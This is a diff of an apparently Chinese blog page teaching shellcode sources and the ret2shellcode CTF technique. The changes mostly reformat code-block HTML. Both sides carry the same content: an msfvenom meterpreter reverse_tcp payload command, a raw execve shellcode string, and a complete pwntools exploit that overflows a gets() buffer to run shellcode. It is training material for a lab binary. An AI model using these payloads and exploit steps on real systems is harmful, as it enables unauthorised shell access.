@@ -290,7 +290,7 @@
 
 
                 <time class="article-time--reading">
-                    2 minute read
+                    1 minute read
                 </time>
             </div>
         
@@ -319,28 +319,12 @@
 <p>获取ShellCode有很多种方法，这里简单介绍几种</p>
 <h4 id="利用pwntools自带函数">利用PWNTools自带函数</h4>
 <p>首先设置<strong>目标程序</strong> 的参数</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span><span class="c1"># os指操作系统，这里是Linux</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># arch指架构，64位一般是amd64，32位一般是i386</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># log_level指日志输出的等级，debug为调试模式</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>然后用<code>shellcraft.sh()</code>函数获取ShellCode的<strong>汇编代码</strong>，再调用<code>asm()</code>变成机器码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="网上找现成的shellcode">网上找现成的ShellCode</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span><span class="c1"># os指操作系统，这里是Linux</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"># arch指架构，64位一般是amd64，32位一般是i386</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"># log_level指日志输出的等级，debug为调试模式</span>
+</span></span></code></pre></div><p>然后用<code>shellcraft.sh()</code>函数获取ShellCode的<strong>汇编代码</strong>，再调用<code>asm()</code>变成机器码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</span></span></code></pre></div><h4 id="网上找现成的shellcode">网上找现成的ShellCode</h4>
 <p><a class="link" href="http://shell-storm.org/shellcode/"  target="_blank" rel="noopener"
     >ShellStorm: 一个国外ShellCode集合</a></p>
 <p>ShellStorm中包含多种平台，多种长度，多种功能的ShellCode</p>
@@ -349,27 +333,13 @@
 <p>答: 有时候栈中填入的ShellCode有长度限制</p>
 </blockquote>
 <p>这里举个例子，只有8字节的ShellCode</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="s2">&#34;\x99\x6a\x0b\x58\x60\x59\xcd\x80&#34;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="metasploit">metasploit</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl"><span class="s2">&#34;\x99\x6a\x0b\x58\x60\x59\xcd\x80&#34;</span>
+</span></span></code></pre></div><h4 id="metasploit">metasploit</h4>
 <p>想要一个功能更强大且不想要网上到处找？</p>
 <p>MSF的<code>meterpreter</code>你绝对喜欢</p>
 <p>生成ShellCode命令</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;Local IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Local Port&gt; -f &lt;language&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="自己写">自己写</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;Local IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Local Port&gt; -f &lt;language&gt;
+</span></span></code></pre></div><h4 id="自己写">自己写</h4>
 <p>建议新手采用前几种方案，要是各位有兴趣自己写ShellCode的话可以参考这个<a class="link" href="https://www.exploit-db.com/docs/english/13610-building-your-own-ud-shellcodes-part-1.pdf"  target="_blank" rel="noopener"
     >PDF</a></p>
 <h2 id="pwn-pwn-pang">PWN! PWN! PANG?</h2>
@@ -386,29 +356,15 @@
 </ul>
 <h2 id="ret2shellcode">ret2shellcode</h2>
 <p>先<code>checksec</code>一下</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ checksec ret2shellcode
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/pwn/桌面/ROP/ret2shellcode&#39;</span>
-</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
-</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
-</span></span><span class="line"><span class="cl">    Stack:    No canary found
-</span></span><span class="line"><span class="cl">    NX:       NX disabled
-</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
-</span></span><span class="line"><span class="cl">    RWX:      Has RWX segments
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>看到这个32位程序NX是关闭的，而且有同时可以读，写，执行的段(也就是栈)，我们想到可以把ShellCode写入栈中，并通过栈溢出返回到栈中的ShellCode</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">$ checksec ret2shellcode
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/pwn/桌面/ROP/ret2shellcode&#39;</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="ln">6</span><span class="cl">    NX:       NX disabled
+</span></span><span class="line"><span class="ln">7</span><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</span></span><span class="line"><span class="ln">8</span><span class="cl">    RWX:      Has RWX segments
+</span></span></code></pre></div><p>看到这个32位程序NX是关闭的，而且有同时可以读，写，执行的段(也就是栈)，我们想到可以把ShellCode写入栈中，并通过栈溢出返回到栈中的ShellCode</p>
 <p><strong>但是，我们貌似忽视了一个重要的问题</strong></p>
 <p>目标机一般都是完全打开<strong>ASLR</strong>，也就意味着每次运行程序时，组件(包括堆栈，堆和库)都将移至虚拟内存中的其他地址。 我们无法通过反复试验来了解目标所在，因为每次的地址都会不同。</p>
 <p>因此，很显然我们并不能找到ShellCode的地址，也就没办法返回到栈上的ShellCode</p>
@@ -434,37 +390,19 @@
 <hr>
 <h3 id="反汇编分析">反汇编分析</h3>
 <p>查看主函数反编译出的C代码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span> <span class="c1">// [esp+1Ch] [ebp-64h] BYREF
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;No system for you this time !!!&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">gets</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">strncpy</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x64u</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;bye bye ~&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>我们可以看出这里通过<code>gets()</code>读入了数组<code>s</code>,并把数组<code>s</code>的值传给了<code>buf2</code>，而这个<code>buf2</code>位于<code>.bss</code>节(看起来应该是一个全局变量)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span> <span class="c1">// [esp+1Ch] [ebp-64h] BYREF
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;No system for you this time !!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="n">gets</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">  <span class="n">strncpy</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x64u</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;bye bye ~&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>我们可以看出这里通过<code>gets()</code>读入了数组<code>s</code>,并把数组<code>s</code>的值传给了<code>buf2</code>，而这个<code>buf2</code>位于<code>.bss</code>节(看起来应该是一个全局变量)</p>
 <p>想到这里，我们<strong>不禁露出了恶毒的笑容</strong></p>
 <p>我们在数组<code>s</code>中读入的shellcode会被程序同时放在<code>buf2</code>中，这样我们通过溢出数组s,把</p>
 <p><code>main</code>函数的返回地址覆盖成<code>buf2</code>的地址即可</p>
@@ -490,35 +428,18 @@
 </blockquote>
 <p>但由于我们还需要写入ShellCode，我们必须选一个<strong>小于等于112字节</strong>的ShellCode,并把<strong>不足</strong>112字节的部分用<strong>垃圾数据填充</strong></p>
 <p>由此写出EXP:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
-</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
-</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;ret2shellcode&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ret2shellcode&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">112</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;buf2&#34;</span><span class="p">])</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#shellcode.ljust(112,b&#39;A&#39;)指shellcode不够112字节的地方用A填充</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="ref">Ref</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;ret2shellcode&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ret2shellcode&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">112</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;buf2&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1">#shellcode.ljust(112,b&#39;A&#39;)指shellcode不够112字节的地方用A填充</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h2 id="ref">Ref</h2>
 <p><a class="link" href="https://blog.csdn.net/weixin_43916678/article/details/107181228"  target="_blank" rel="noopener"
     >https://blog.csdn.net/weixin_43916678/article/details/107181228</a></p>
 <p><a class="link" href="https://blog.csdn.net/qq_35495684/article/details/79583232"  target="_blank" rel="noopener"
